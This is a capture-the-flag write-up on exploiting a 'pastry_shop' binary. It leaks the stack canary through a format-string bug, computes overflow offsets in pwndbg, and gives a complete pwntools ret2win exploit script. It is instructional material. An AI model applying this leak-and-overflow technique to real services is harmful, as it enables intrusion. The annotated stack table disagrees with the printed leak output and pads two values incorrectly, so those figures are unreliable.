## Pastry Shop - ret2win with Canary Leak

### Understanding the Code

The binary exposes two distinct vulnerabilities in two separate functions. The `greet()` function contains a format string vulnerability because it passes user input directly to `printf(name)` without a format specifier, which gives us an arbitrary stack read primitive. The `vuln()` function contains a classic stack buffer overflow because it calls `read()` to copy up to 256 bytes into a buffer that is only 64 bytes wide, which is more than enough room to overwrite the canary, the saved RBP, and the return address.

### Checking Protections on the Binary

```bash
checksec --file ./pastry_shop
```

The output tells us everything we need to plan the exploit. A canary is present, so a blind overflow will be caught at runtime and we must leak the canary value before overwriting it. NX is enabled, so the stack is not executable and we cannot inject shellcode directly. PIE is disabled, which means `win()` has a fixed, predictable address on every run and we do not need to leak a code pointer to find it. The binary is also not stripped, so symbol names like `win` are still visible and pwntools can resolve them by name.

### Leaking the Canary Position

We run the binary and send a `%lx` chain to the name prompt to walk the stack and print each 8-byte slot in raw hexadecimal:

```sh
python3 -c "print('AAAA.' + '.'.join(['%lx']*25))" | ./pastry_shop

# output:
AAAA.7fb7eacf9b23.fbad208b.7fb7eabf3862.0.0.786c252e41414141. \
786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e. \
786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e. \
786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e. \
a.0.7fff62314ac0.7fff62314bd8.1aac69d31ca6200.7fff62314ac0.401440
```

When `printf` processes the format string, it walks up the stack and prints each word without leading zeros. Numbering the values from 1:

```
index 1  → 00007f66d9d08b23
index 2  → 00000000fbad208b
index 3  → 00007f66d9c02862
index 4  → 0000000000000000
index 5  → 0000000000000000
index 6  → 786c252e41414141   ← our AAAA marker
index 7  → 786c252e786c252e
...
index 23 → 04f2f720c500e600   ← canary (ends in 00)
index 24 → 7ffd7c8912900000
index 25 → 4014400000000000
````

Index 6 is our buffer because `41414141` is `AAAA` in hex and `786c252e` is `.%lx` in hex, so that slot is exactly where our input string begins on the stack. Index 23 is the canary because it is the only value whose lowest byte is `00`, and it sits at precisely the right position on the stack between the local variables and the saved RBP/RIP pair.

> [!tip] The canary's LSB is forced to `00` precisely so that string functions like `strcpy` or `printf %s` stop reading before they can leak it. That is why we need `%lx` instead, since it reads raw stack words regardless of null bytes.

Once we are confident in index 23, we verify it cleanly with a direct parameter access specifier:

```bash
python3 -c "print('%23\$lx')" | ./pastry_shop
```

### Finding the Offset to the Canary

We need to find where the canary sits relative to the start of `buf`, and we do this by corrupting the stack with a known cyclic pattern and then asking GDB at what offset the corruption landed.

```sh
gdb ./pastry_shop
pwndbg> cyclic 100
# output: aaaabaaa...
pwndbg> run
```

When the program prompts for a name, type just `AAAA` since we do not need the format string at this stage, and then paste the full cyclic pattern at the order prompt.

> [!abstract] Theory
> Theory Recall When a standard buffer overflow happens without a canary, the program crashes precisely when it tries to execute the cyclic pattern as a return address. When a canary is present, however, the program catches the corruption before that happens and immediately aborts by jumping into system libraries through the chain `__stack_chk_fail` → `abort` → `pthread_kill`.

Once the program aborts, use the backtrace command to walk back through the call stack:

```sh
pwndbg> bt
```

Find the frame corresponding to the vulnerable function and switch to it with `frame <num>`. If you want to be mathematically precise about what occupies the canary slot, you can verify it using the RBP as a reference:

1. **Calculate the canary address**: since the canary lives at `rbp - 0x8`, run `pwndbg> print $rbp - 0x8`. Example output: `$5 = (void *) 0x7fffffffe2e8`.
2. **Examine the content**: dereference that address to read the current value: `pwndbg> print *0x7fffffffe2e8`. Example output: `$6 = 1633771891`.
3. **Reverse search with cyclic** — feed that integer back to cyclic to find the offset: `pwndbg> cyclic -l 1633771891`. Output: `Finding cyclic pattern of 4 bytes: b'saaa' ... Found at offset 72`.

### Final Offset Calculations

With the crash analysis complete, the two critical offsets are straightforward to compute. The offset to the canary is **72 bytes**, which is the distance from the start of `buf` to where the canary sits. The offset to RIP follows directly from the stack layout:

> **Offset to RIP** = Offset to Canary (72) + 8 bytes (Canary) + 8 bytes (Saved RBP) = **88 bytes**

### Finding the `ret` Gadget

Because we are on x86_64, the stack must be 16-byte aligned at the moment of a `call` instruction, and if the exploit crashes inside `win()` this misalignment is the most likely cause. We insert a single `ret` gadget before the target address to consume one stack slot and restore alignment:
```
ROPgadget --binary ./pastry_shop | grep ": ret$"

# output:
0x000000000040101a : ret
````

### The Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./pastry_shop")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

CANARY_IDX = 23

OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88

GADGET = 0x000000000040101a   # ret — stack alignment


def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)


def main():
    r = conn()

    # ── leak phase ────────────────────────────────────────────────────────────
    r.recvuntil(b'dear customer?\n')
    r.sendline(f"%{CANARY_IDX}$lx".encode())
    leak   = r.recvline().strip()
    canary = int(leak, 16)
    log.info(f"canary = {canary:#x}")

    # ── exploit phase ─────────────────────────────────────────────────────────
    r.recvuntil(b'to order?\n')
    payload = flat(
        b'A' * OFFSET_TO_CANARY,
        p64(canary),
        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()


if __name__ == '__main__':
    main()
```